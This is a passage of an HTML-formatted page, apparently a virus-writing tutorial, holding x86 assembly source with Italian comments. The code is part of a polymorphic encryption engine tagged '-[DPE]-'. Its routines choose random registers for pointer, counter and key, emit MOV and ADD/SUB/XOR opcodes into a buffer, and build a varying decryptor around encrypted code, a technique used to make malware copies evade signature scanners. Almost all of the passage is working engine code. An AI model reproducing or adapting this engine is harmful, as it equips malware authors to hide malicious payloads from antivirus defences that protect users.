color:#CCFFFF'><span style="mso-spacerun: yes">       </span>dec<span
style="mso-spacerun: yes">     </span>dx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>or<span style="mso-spacerun: yes">      </span>dx,dx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>jnz<span style="mso-spacerun: yes">     </span>encrypt_loop<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>cx,di<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>pop<span
style="mso-spacerun: yes">     </span>dx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>sub<span
style="mso-spacerun: yes">     </span>cx,dx<span style="mso-spacerun:
yes">                   </span>; lunghezza totale<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>ret<span
style="mso-spacerun: yes">                             </span>; fine<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; tabella con basi numeriche per codificare le istruzioni per la
crittazione <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; (ADD,XOR,SUB) e relativa istruzione per la decrittazione
(SUB,XOR,ADD)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Questi NON sono gli opcode delle istruzioni ADD/SUB/XOR ma dei
numeri che poi <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; serviranno per la codifica delle istruzioni di
crittazione/decrittazione <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; e’ una sorta di ottimizzazione.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>mathadds<span style="mso-spacerun: yes">  </span>db<span
style="mso-spacerun: yes">      </span>01h,29h<span style="mso-spacerun:
yes">    </span>; ADD SUB<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">          </span>db<span
style="mso-spacerun: yes">      </span>31h,31h<span style="mso-spacerun:
yes">    </span>; XOR XOR <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">          </span>db<span
style="mso-spacerun: yes">      </span>29h,01h<span style="mso-spacerun:
yes">    </span>; SUB ADD<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Possibili modi per controllare che il contatore sia 0
(cmp,xor,or,sub,add)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>cntr_checks<span style="mso-spacerun:
yes">     </span>db<span style="mso-spacerun: yes">     
</span>0c0h,0c8h,0e8h,0f0h,0f8h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Tabella con gli offset per le tre operazioni di
inizializzazione</span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'> pre-loop<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; in pratica funziona come uno switch. Attenzione: sono words !<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>init_offs<span style="mso-spacerun:
yes">   </span>dw<span style="mso-spacerun: yes">      </span>offset
do_pointer<span style="mso-spacerun: yes">      </span>; SI = 0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">            </span>dw<span style="mso-spacerun: yes">      </span>offset
do_counter<span style="mso-spacerun: yes">      </span>; SI = 1 <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">            </span>dw<span style="mso-spacerun: yes">      </span>offset
do_setkey<span style="mso-spacerun: yes">     </span><span style="mso-spacerun:
yes">  </span>; SI = 2<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Tabella con gli offset per le operazioni del loop<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>loop_offs<span style="mso-spacerun:
yes">   </span>dw<span style="mso-spacerun: yes">      </span>offset
do_changekey<span style="mso-spacerun: yes">    </span>; SI = 0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">            </span></span></b><b><span lang=FR style='mso-fareast-font-family:
"MS Mincho";color:#CCFFFF;mso-ansi-language:FR'>dw<span style="mso-spacerun:
yes">      </span>offset dec_cnt<span style="mso-spacerun: yes">        
</span>; SI = 1 <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:FR'><span style="mso-spacerun: yes">   </span><span
style="mso-spacerun: yes">         </span>dw<span style="mso-spacerun:
yes">      </span>offset inc_pnt<span style="mso-spacerun: yes">        
</span>; SI = 2 <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:FR'><span style="mso-spacerun: yes">           
</span></span></b><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>dw<span style="mso-spacerun: yes">     
</span>do_mathop<span style="mso-spacerun: yes">              </span>; SI = 3 <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>poly_marker_ver db<span style="mso-spacerun: yes">     
</span>0,'-[DPE]-',0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; do_pointer crea l'istruzione per l'inizializzazione del
puntatore al<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; codice crittato<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; ricordiamo che:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<span style="mso-spacerun: yes">   </span>AX<span
style="mso-spacerun: yes">   </span>CX<span style="mso-spacerun: yes">  
</span>DX<span style="mso-spacerun: yes">   </span>BX<span style="mso-spacerun:
yes">   </span>SP<span style="mso-spacerun: yes">   </span>BP<span
style="mso-spacerun: yes">   </span>SI<span style="mso-spacerun: yes">  
</span>DI<span style="mso-spacerun: yes">  </span>-&gt; registro<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<span style="mso-spacerun: yes">    </span>0<span
style="mso-spacerun: yes">    </span>1<span style="mso-spacerun: yes">   
</span>2<span style="mso-spacerun: yes">    </span>3<span style="mso-spacerun:
yes">    </span>4<span style="mso-spacerun: yes">    </span>5<span
style="mso-spacerun: yes">    </span>6<span style="mso-spacerun: yes">   
</span>7<span style="mso-spacerun: yes">  </span>-&gt; numero registro<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<span style="mso-spacerun: yes">   </span>no<span
style="mso-spacerun: yes">    </span>no<span style="mso-spacerun: yes"> 
</span>no<span style="mso-spacerun: yes">   </span>si<span style="mso-spacerun:
yes">   </span>no<span style="mso-spacerun: yes">   </span>no<span
style="mso-spacerun: yes">   </span>si<span style="mso-spacerun: yes">  
</span>si<span style="mso-spacerun: yes">  </span>-&gt; possibile utilizzo<span
style="mso-spacerun: yes">    </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; ricordiamo inoltre che in BX c’è l’offset di already_pnt (a
cui segue counter, key…, <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; ognuno di un byte).<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; quando il controllo arriva qui SI = 0<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>do_pointer:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>call<span
style="mso-spacerun: yes">    </span>sorta_random_07<span style="mso-spacerun:
yes">         </span>; in AX casuale da 0 a 7<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>al,byte ptr ds:[bx+2]<span
style="mso-spacerun: yes">   </span>; non lo stesso numero usato x la key<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>je<span
style="mso-spacerun: yes">      </span>do_pointer<span style="mso-spacerun:
yes">              </span>; se già stata chiamata<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>al,byte ptr ds:[bx+1]<span
style="mso-spacerun: yes">   </span>; non lo stesso numero usato x il cntr<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>je<span
style="mso-spacerun: yes">      </span>do_pointer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>al,03<span style="mso-spacerun:
yes">       </span><span style="mso-spacerun: yes">          </span>; BX
potrebbe andare bene. Vai<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>je<span
style="mso-spacerun: yes">      </span>ok_selected<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>al,6<span style="mso-spacerun:
yes">                  </span>; non SP e BP, ma solo &gt;, cioe'<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>jb<span
style="mso-spacerun: yes">      </span>do_pointer<span style="mso-spacerun:
yes">            </span>; SI e DI (quindi possibili solo BX,SI,DI)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; a questo punto in [SI] è l’indirizzo di already_pnt+0 e in AL
il numero registro<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; con add, 0b8h abbiamo come risultato nel buffer di salvataggio
DS:DI = 06h + 0b8h = <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>; MOV BX , imm. </span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFCC'>Ricordiamo che STOSB
o STOSW aggiornano il puntatore a [DI]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>ok_selected:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>byte ptr ds:[si],al<span
style="mso-spacerun: yes">     </span>; Salva registro usato +<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>add<span
style="mso-spacerun: yes">     </span>al,0b8h<span style="mso-spacerun:
yes">                 </span>; base di MOV reg16,imm<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosb<span
style="mso-spacerun: yes">                           </span>; scrive
l’istruzione (AL -&gt; [DI]+1)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; ricordiamo che alla locazione [bx-8] troviamo pointer_ass<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; con la seguente istruzione salviamo la posizione
dell’assegnazione del puntatore<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; per aggiornarla in seguito<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>word ptr ds:[bx-8],di<span
style="mso-spacerun: yes">   </span>; salvataggio<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosw<span
style="mso-spacerun: yes">                           </span>; scrive AX (AX
-&gt; [DI]+2)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; do_counter crea l'inizializzazione del registro che fungera'
da counter<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; quando il controllo arriva qui SI = 1<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>do_counter:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>call<span style="mso-spacerun: yes">    </span>sorta_random_07 <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>cmp<span style="mso-spacerun: yes">     </span>al,04h<span
style="mso-spacerun: yes">                  </span>; no SP (registro n.4)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>je<span
style="mso-spacerun: yes">      </span>do_counter<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>or<span
style="mso-spacerun: yes">      </span>al,al<span style="mso-spacerun:
yes">                   </span>; Non usare AX (registro n.0)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>jz<span
style="mso-spacerun: yes">      </span>do_counter<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>al,byte ptr ds:[bx]<span
style="mso-spacerun: yes">     </span>; Non usare lo stesso del pntr
(BX=already_pnt)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>je<span
style="mso-spacerun: yes">      </span>do_counter<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>al,byte ptr ds:[bx+2]<span
style="mso-spacerun: yes">   </span>; Non usare lo stesso della key<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>je<span
style="mso-spacerun: yes">      </span>do_counter<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; a questo punto in [SI] è l’indirizzo di already_pnt+1 e in AL
il numero registro<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; con add, 0b8h abbiamo come risultato nel buffer di salvataggio
DS:DI = 06h + 0b8h = <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>; MOV BX , imm. </span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#CCFFCC'>Ricordiamo che STOSB
o STOSW aggiornano il puntatore a [DI]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>byte ptr ds:[si],al<span
style="mso-spacerun: yes">     </span>; Salva registro usato +<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>add<span
style="mso-spacerun: yes">     </span>al,0b8h<span style="mso-spacerun:
yes">                 </span>; base di un MOV reg16,imm<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosb<span
style="mso-spacerun: yes">                           </span>; scrive Al -&gt;
DS:[DI]+1<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>not_zeromore:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; Critteremo un po' di piu' del dovuto per dare maggior
variazione ai risultati<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>call<span
style="mso-spacerun: yes">    </span>sorta_random_07<span style="mso-spacerun:
yes">         </span>; AX da 0 a 7<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>or<span
style="mso-spacerun: yes">      </span>al,al<span style="mso-spacerun:
yes">                   </span>; elimina lo zero<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>jz<span style="mso-spacerun: yes">      </span>not_zeromore<span
style="mso-spacerun: yes">            </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>add<span style="mso-spacerun: yes">     </span>ax,word ptr ds:[bx-0ah] ;
in AX offset length<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>mov<span style="mso-spacerun: yes">     </span>word ptr
ds:[bx-2],di<span style="mso-spacerun: yes">   </span>; salva posizione di
assegn. (decr_begin)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosw<span
style="mso-spacerun: yes">                           </span>; salva lunghezza
in [DI]+2<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>mov<span style="mso-spacerun: yes">     </span>word ptr ds:[bx-0ah],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; do_setkey crea l'inizializzazione del valore della chiave per
la<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; decrittazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; 50% delle probabilita' che si usi la chiave, 50% che sia fatto
con chiave fissa<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
